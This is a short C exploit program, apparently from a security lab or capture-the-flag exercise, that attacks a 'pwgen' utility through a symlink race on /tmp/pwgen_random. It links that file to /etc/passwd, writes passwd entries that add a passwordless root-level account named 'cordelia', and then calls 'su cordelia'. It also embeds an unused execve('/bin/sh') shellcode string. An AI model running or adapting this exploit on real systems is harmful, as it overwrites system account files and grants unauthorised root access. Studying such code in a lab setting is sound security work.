#include <stdio.h>
#include "stdlib.h"
static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
#include <sys/wait.h>
#include <shadow.h>
//check /tmp/pwgen_random

int main(int argc, char *argv[])
{
  FILE *pointer;
  int systemInt;
  pointer = popen("pwgen -e", "w");
  // vulnerability at check_perms() and /tmp/pwgen_random 
  remove("/tmp/pwgen_random");
  //remove the original file created
  symlink("/etc/passwd", "/tmp/pwgen_random"); 
  //create new sym link to the file created
  
  fprintf(pointer, "\nroot:x:0:0:root:/root:/bin/bash\n\
user::1000:1000::/home/user:/bin/sh\n\
halt::0:1001::/:/sbin/halt\n\
sshd:x:100:65534::/var/run/sshd:/usr/sbin/nologin\n\
cordelia::0:0:root:/root:/bin/bash\n");   
  //commands for new user and new shell        
  fclose(pointer);
  //switch to new user cordelia
  systemInt = system("su cordelia");
  if ( systemInt == -1)  // if there is error fail prog
  {
    perror("system");
    exit(EXIT_FAILURE);
  }
  return 0;
}